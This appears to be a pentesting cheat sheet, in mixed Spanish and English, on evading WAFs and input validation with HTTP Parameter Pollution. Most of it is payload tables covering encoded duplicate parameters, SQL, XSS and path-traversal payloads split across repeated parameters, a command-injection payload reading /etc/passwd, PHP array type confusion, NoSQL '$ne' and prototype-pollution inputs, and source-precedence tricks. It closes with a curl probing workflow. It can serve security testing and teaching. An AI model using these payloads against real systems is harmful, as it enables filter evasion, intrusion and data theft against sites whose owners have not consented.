---
aliases:
  - HPP Bypass
  - Filter Evasion HPP
  - Multi-Source HPP
tags:
  - type/cheatsheet
  - vuln/hpp
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Parameter Pollution]]'
---
# HPP - Bypass de Validación

***

## Encoding Tricks (URL-encoded duplicates)

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| URL-encode segundo nombre | `?a=1&%61=2` (`%61`=`a`) | Frontend WAF check string `a`, decoded match. |
| Mixed case | `?a=1&A=2` | Case-sensitive WAF bypass. |
| Doble encoding | `?a=1&%2561=2` | Multi-decode bypass. |
| Hex variants | `%41=1&%61=2` (A vs a) | Edge filter. |
| Unicode lookalike | `?a=1&ａ=2` (full-width) | If parser normalizes. |
| Space substitution | `+` decoded a space | Edge URL form encoding. |
| Combine encoding + duplicate | `?a=1&%61%61=2` (`aa`) — different name | Bypass. |
| Encoded equals | `?a=1%3D2` (literal `=`) — single value | NOT splitting. |
| URL-encoded ampersand | `?a=1%26a=2` (literal `&`) — single value | NOT useful. |
| WAF only inspects raw URL | Decoded backend → bypass | Standard. |
| Combine con HRS | Smuggle params via duplicate | Multi-vector. |
| HTTP/2 :path with encoded params | H2 specific | Modern. |
^hpp-bypass-encoding

___

## Splitting Param Values

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| ASP.NET split | `?q=SELECT&q=*&q=FROM&q=users` → backend gets `"SELECT,*,FROM,users"` | Standard. |
| WAF signature evasion | Each fragment innocuous individually | Bypass. |
| SQL keywords split | `SELECT`, `UNION`, `INSERT` split | Standard. |
| XSS payload split | `<script>` tag fragmented | Standard. |
| Path traversal split | `..`, `/`, `etc/passwd` split | Standard. |
| Combine con encoding | Each fragment encoded differently | Multi-layer. |
| Combine con comments | `?q=SELECT&q=/*&q=*/&q=FROM` | Comment injection. |
| LDAP filter split | LDAP query fragments | Adjacent. |
| Command injection split | `?cmd=ls&cmd=;&cmd=cat&cmd=/etc/passwd` | Standard. |
| Custom backend concat | Per-app concatenation logic | Per-target. |
^hpp-bypass-split

___

## Array Notation (`a[]=1&a[]=2`)

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| PHP array | `?a[]=1&a[]=2` → `$_GET['a'] = ['1','2']` | Standard PHP. |
| Mixed scalar/array | `?a=1&a[]=2` → behavior varies | Edge. |
| Type confusion | If app expects string, gets array → may bypass type check | Standard. |
| Integer array | `?a[0]=1&a[1]=2` → indexed array | Same. |
| Associative | `?a[key1]=1&a[key2]=2` → assoc array | PHP/Rails. |
| Nested | `?a[b][c]=1&a[b][c]=2` → nested | Edge. |
| Combine con prototype pollution | `?__proto__[a]=1` con qs lib | PP combo. |
| Bypass strict typing | If validation expects string, array crashes/bypasses | Type juggling. |
| Combine con SQLi | Array values en query | Edge. |
| Combine con NoSQL operators | `?username[$ne]=null` | NoSQLi adjacent. |
| Express qs library | Default array parsing | Standard. |
| Custom array delimiters | `?a=1,2,3` parsed as array per-app | Per-app. |
^hpp-bypass-array

___

## Mixed Input Sources (Query + Body + Cookie)

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Query + body conflict | `?a=1` con body `a=2` | Per-stack precedence. |
| PHP `$_REQUEST` | EGPCS order — last source wins | Per-config. |
| ASP.NET `Request.Params` | Combined sources | Concatenation. |
| Cookie + query | Same param en cookie + URL | Edge. |
| Multipart + URL | File upload con URL params | Edge. |
| JSON body con form fallback | App tries JSON first, falls back to form | Multi-parser. |
| Header injection | If param read from header (rare) | Edge. |
| WebSocket message | WS frame con params | Real-time. |
| GraphQL variables vs operation | Different parsers | GraphQL. |
| GET + POST hybrid | `POST /endpoint?a=1` con body `a=2` | Common. |
| Combine con method override | `?_method=PUT` con body method | Compound. |
| Auth header vs cookie | Token en multiple places | Edge. |
| Custom backend logic | Per-app behavior | Per-target. |
| Bypass via source switch | If filter on body, bypass via query | Standard. |
^hpp-bypass-multi-source

### Workflow probe multi-source

```bash
TARGET="https://target/endpoint"

# Query only
curl -s "$TARGET?a=QUERY_VAL"

# Body only
curl -s -X POST -d "a=BODY_VAL" "$TARGET"

# Both
curl -s -X POST -d "a=BODY_VAL" "$TARGET?a=QUERY_VAL"

# Cookie + query
curl -s -b "a=COOKIE_VAL" "$TARGET?a=QUERY_VAL"

# JSON + query
curl -s -X POST -H "Content-Type: application/json" -d '{"a":"JSON_VAL"}' "$TARGET?a=QUERY_VAL"

# Compare responses → identify precedence
```

***
